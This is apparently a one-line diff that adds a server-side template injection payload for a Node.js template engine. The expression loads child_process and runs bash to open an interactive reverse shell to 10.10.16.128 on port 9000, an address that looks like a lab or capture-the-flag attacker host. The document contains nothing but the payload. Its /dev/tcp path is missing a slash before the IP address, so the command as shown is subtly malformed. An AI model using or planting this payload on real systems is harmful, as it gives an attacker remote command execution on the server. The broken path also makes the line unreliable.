@@ -1,0 +1,1 @@
+{{ process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp10.10.16.128/9000 0>&1"') }}
